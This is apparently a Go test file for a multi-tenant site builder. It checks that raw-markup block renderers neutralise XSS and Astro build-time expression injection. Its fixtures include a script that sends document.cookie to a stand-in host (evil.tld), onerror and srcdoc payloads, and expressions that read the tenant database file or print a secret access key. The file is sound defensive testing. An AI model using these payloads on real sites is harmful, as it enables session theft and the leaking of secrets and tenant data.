package builder

import (
	"encoding/json"
	"os"
	"regexp"
	"strings"
	"testing"

	"github.com/bright-interaction/slab/internal/store"
)

// Every block renderer is a tenant-content sink. Two of the three raw-markup
// ones (custom, raw_astro) emitted the tenant string verbatim while only
// raw_html was sanitized, and the comments in each layer named the other layer
// as the authoritative defense, so in practice neither ran.
//
// This drives the payloads through the sinks directly rather than trusting a
// per-renderer reading, so a new block type that forgets to sanitize fails
// here instead of in production.
func TestRawBlockSinksAreSanitized(t *testing.T) {
	const xss = `<script>fetch('https://evil.tld/?c='+document.cookie)</script>`

	tests := []struct {
		name   string
		render func() string
	}{
		{"custom.markup", func() string {
			return renderCustomBlock(map[string]any{"markup": xss})
		}},
		{"raw_astro.code", func() string {
			return renderRawAstroBlock(map[string]any{"code": xss})
		}},
		{"custom.markup img onerror", func() string {
			return renderCustomBlock(map[string]any{"markup": `<img src=x onerror=alert(1)>`})
		}},
		{"raw_astro.code iframe srcdoc", func() string {
			return renderRawAstroBlock(map[string]any{"code": `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`})
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := tt.render()
			low := strings.ToLower(out)
			for _, bad := range []string{"<script", "onerror=", "srcdoc="} {
				if strings.Contains(low, bad) {
					t.Errorf("%s survived into rendered output: %q", bad, out)
				}
			}
		})
	}
}

// raw_astro is a CODE sink, not just a markup sink: its output is written into
// a generated .astro file where `{expr}` is evaluated by Astro in Node at build
// time, with the build process environment in scope. Sanitizing HTML does not
// close that, because braces are ordinary text to an HTML sanitizer. This is
// the half that could print a server secret onto the public page, and CSP does
// not apply to build-time evaluation.
func TestRawAstroBlockNeutralisesBuildTimeExpressions(t *testing.T) {
	tests := []string{
		`<div>{process.env.LITESTREAM_SECRET_ACCESS_KEY}</div>`,
		`<div>{import.meta.env.SECRET}</div>`,
		`<span>{await fetch('https://evil.tld')}</span>`,
	}
	for _, in := range tests {
		out := renderRawAstroBlock(map[string]any{"code": in})
		if strings.Contains(out, "{") || strings.Contains(out, "}") {
			t.Errorf("a build-time expression survived in raw_astro output: %q", out)
		}
		if strings.Contains(out, "process.env") && !strings.Contains(out, "&#123;") {
			t.Errorf("process.env reference is not brace-neutralised: %q", out)
		}
	}
}

// The sanitizer must not be so aggressive that ordinary authored markup stops
// working, or authors route around the block entirely.
func TestRawBlockSinksKeepLegitimateMarkup(t *testing.T) {
	out := renderCustomBlock(map[string]any{
		"markup": `<p>Hello <strong>world</strong>, see <a href="https://example.com">this</a>.</p>`,
	})
	for _, want := range []string{"<p>", "<strong>", "world", `href="https://example.com"`} {
		if !strings.Contains(out, want) {
			t.Errorf("legitimate markup %q was stripped from: %q", want, out)
		}
	}
}

// ---------------------------------------------------------------------------
// The guard. This class has recurred three times in this package, so the tests
// below enumerate the sinks from the SOURCE rather than from what a reviewer
// remembered to list.
// ---------------------------------------------------------------------------

// astroRawFields are the data keys whose value is written into generated
// .astro output as markup rather than as escaped text. Every one of them is a
// build-time code sink, because `{...}` in .astro source is JavaScript that
// Astro evaluates in Node during the build.
var astroRawFields = []string{"markup", "code", "html"}

// astroExprPayloads are real attacks, not shapes. The first reads the
// multi-tenant SQLite file onto the attacker's own published page; the second
// prints a build-environment secret. Neither needs a single character that an
// HTML sanitizer has any reason to touch.
var astroExprPayloads = []string{
	`<b>{(await import('node:fs')).readFileSync('/app/data/atomicsite.db','utf8')}</b>`,
	`<p>hello {process.env.LITESTREAM_SECRET_ACCESS_KEY} world</p>`,
}

// liveAstroExpressions are fragments that can only exist if a tenant-supplied
// brace reached the .astro source unneutralised. Checking these rather than
// "the output contains no brace at all" keeps the guard honest for renderers
// that emit braces of their own (search_box ships an inline script).
var liveAstroExpressions = []string{"{(await", "{process.env", "'utf8')}", "_ACCESS_KEY}"}

func assertNoLiveAstroExpression(t *testing.T, where, out string) {
	t.Helper()
	for _, bad := range liveAstroExpressions {
		if strings.Contains(out, bad) {
			t.Errorf("%s: build-time expression %q reached .astro output:\n%s", where, bad, out)
		}
	}
	// If the payload survived at all it has to be there in neutralised form, so
	// a renderer cannot pass by dropping the field instead of sanitizing it and
	// then quietly start emitting it again later.
	if strings.Contains(out, "readFileSync") || strings.Contains(out, "LITESTREAM") {
		if !strings.Contains(out, "&#123;") {
			t.Errorf("%s: payload survived but carries no neutralised brace:\n%s", where, out)
		}
	}
}

// renderDataBlockCaseTypes reads the block types out of renderDataBlock's
// switch in pages.go, so a new block type joins this guard the moment it is
// added rather than when somebody remembers to add it.
func renderDataBlockCaseTypes(t *testing.T) []string {
	t.Helper()
	src, err := os.ReadFile("pages.go")
	if err != nil {
		t.Fatalf("read pages.go: %v", err)
	}
	body := string(src)
	start := strings.Index(body, "func renderDataBlock(")
	if start < 0 {
		t.Fatal("renderDataBlock not found in pages.go; this guard is keyed on it")
	}
	end := strings.Index(body[start:], "\n}\n")
	if end < 0 {
		t.Fatal("could not find the end of renderDataBlock")
	}
	caseRE := regexp.MustCompile(`case "([a-z0-9_]+)":`)
	var types []string
	for _, m := range caseRE.FindAllStringSubmatch(body[start:start+end], -1) {
		types = append(types, m[1])
	}
	if len(types) < 20 {
		t.Fatalf("only %d block types parsed out of renderDataBlock; the parser has drifted", len(types))
	}
	return types
}

// TestEveryBlockTypeIsAstroExpressionSafe walks renderDataBlock's switch and
// pushes a build-time expression through every raw-markup field of every block
// type, plus the unknown-type default.
func TestEveryBlockTypeIsAstroExpressionSafe(t *testing.T) {
	types := append(renderDataBlockCaseTypes(t), "some_block_type_that_does_not_exist")
	for _, bt := range types {
		for _, field := range astroRawFields {
			for _, payload := range astroExprPayloads {
				out := renderDataBlock(bt, map[string]any{field: payload}, nil, "site-1")
				assertNoLiveAstroExpression(t, "renderDataBlock("+bt+")."+field, out)
			}
		}
	}
}

// TestRenderBlockHTMLPathIsAstroExpressionSafe covers the data.html branch in
// renderBlock, a different sink from the switch below it and the third of the
// four to be missed.
func TestRenderBlockHTMLPathIsAstroExpressionSafe(t *testing.T) {
	for _, payload := range astroExprPayloads {
		data, err := json.Marshal(map[string]any{"html": payload})
		if err != nil {
			t.Fatal(err)
		}
		bl := store.Block{ID: "b1", BlockType: "custom", DataJson: string(data)}
		assertNoLiveAstroExpression(t, "renderBlock data.html", renderBlock(bl, nil, nil, "site-1"))
	}
}

// TestGlobalBlockPathIsAstroExpressionSafe covers the fourth sink. A global
// block renders into Base.astro, so it is the header or footer of every page,
// and it had no sanitizer of any kind.
func TestGlobalBlockPathIsAstroExpressionSafe(t *testing.T) {
	for _, slot := range []string{"header", "footer"} {
		for _, payload := range astroExprPayloads {
			data, err := json.Marshal(map[string]any{"html": payload})
			if err != nil {
				t.Fatal(err)
			}
			gb := store.GlobalBlock{ID: "g1", Slot: slot, BlockType: slot, DataJson: string(data)}
			assertNoLiveAstroExpression(t, "extractHTMLFromGlobalBlock("+slot+")", extractHTMLFromGlobalBlock(gb))
			assertNoLiveAstroExpression(t, "ExtractHTMLFromGlobalBlock("+slot+")", ExtractHTMLFromGlobalBlock(gb))
		}
	}
}

// TestRawSinksUseTheSharedAstroHelper is the structural half. Output tests only
// catch the sinks somebody thought to test; this one fails when a renderer
// reaches for the markup-only sanitizer, which is exactly how three of the four
// sinks got the markup half of the defence and missed the code half.
func TestRawSinksUseTheSharedAstroHelper(t *testing.T) {
	entries, err := os.ReadDir(".")
	if err != nil {
		t.Fatalf("read package dir: %v", err)
	}
	forbidden := []string{"sanitizeRawHTML(", "neutraliseAstroExpressions(", "customBlockPolicy.Sanitize("}
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() || !strings.HasSuffix(name, ".go") || strings.HasSuffix(name, "_test.go") || name == "sanitize.go" {
			continue
		}
		src, err := os.ReadFile(name)
		if err != nil {
			t.Fatalf("read %s: %v", name, err)
		}
		for _, bad := range forbidden {
			if strings.Contains(string(src), bad) {
				t.Errorf("%s calls %s directly; a raw sink must route through sanitizeForAstro or sanitizeCustomBlockForAstro", name, bad)
			}
		}
	}
}
